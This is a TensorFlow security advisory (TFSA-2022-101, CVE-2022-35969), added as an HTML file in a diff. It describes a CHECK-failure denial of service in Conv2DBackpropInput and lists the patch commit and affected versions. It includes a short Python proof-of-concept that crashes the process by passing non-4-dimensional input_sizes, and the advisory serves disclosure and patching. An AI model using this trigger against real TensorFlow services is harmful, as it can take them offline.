@@ -1,0 +1,25 @@
+<h2>TFSA-2022-101: <code>CHECK</code> fail in <code>Conv2DBackpropInput</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35969</p>
+<h3>Impact</h3>
+<p>The implementation of <code>Conv2DBackpropInput</code> requires <code>input_sizes</code> to be 4-dimensional. Otherwise, it gives a <code>CHECK</code> failure which can be used to trigger a denial of service attack:
+```python
+import tensorflow as tf</p>
+<p>strides = [1, 1, 1, 1]
+padding = "SAME"
+use_cudnn_on_gpu = True
+explicit_paddings = []
+data_format = "NHWC"
+dilations = [1, 1, 1, 1]
+input_sizes = tf.constant([65534,65534], shape=[2], dtype=tf.int32)
+filter = tf.constant(0.159749106, shape=[3,3,2,2], dtype=tf.float32)
+out_backprop = tf.constant(0, shape=[], dtype=tf.float32)
+tf.raw_ops.Conv2DBackpropInput(input_sizes=input_sizes, filter=filter, out_backprop=out_backprop, strides=strides, padding=padding, use_cudnn_on_gpu=use_cudnn_on_gpu, explicit_paddings=explicit_paddings, data_format=data_format, dilations=dilations)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/50156d547b9a1da0144d7babe665cf690305b33c">50156d547b9a1da0144d7babe665cf690305b33c</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.</p>
